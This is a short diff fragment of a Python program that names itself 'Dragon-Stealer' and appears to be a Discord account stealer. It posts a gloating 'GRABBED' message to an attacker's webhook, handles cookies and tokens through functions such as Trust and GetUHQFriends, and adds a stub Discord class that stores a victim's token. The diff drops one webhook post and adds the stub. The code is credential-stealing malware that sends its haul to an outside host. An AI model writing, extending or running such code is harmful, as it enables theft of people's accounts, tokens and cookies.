@@ -130,9 +130,7 @@ def LoadUrlib(hook, data="", files="", headers=""):
 
 
 payload = {"content": "<:titjob:1083098548977016932> **AYOOO GRABBED SOME DUMMY** ||@everyone||", "username": "Dragon-Stealer", "avatar_url": avatar}
-payload2 = {"content": "https://cdn.discordapp.com/emojis/1083097102588055602.gif", "username": "Dragon-Stealer", "avatar_url": avatar}
 response = requests.post(hook, json=payload)
-response = requests.post(hook, json=payload2)
 
 
 def globalInfo():
@@ -163,6 +161,12 @@ def Trust(Cookies):
     else:
         DETECTED = False
         return DETECTED
+    
+class Discord(): #Updating soon
+    def __init__(self, token):
+        self.token = token
+        
+    
 
 
 def GetUHQFriends(token):
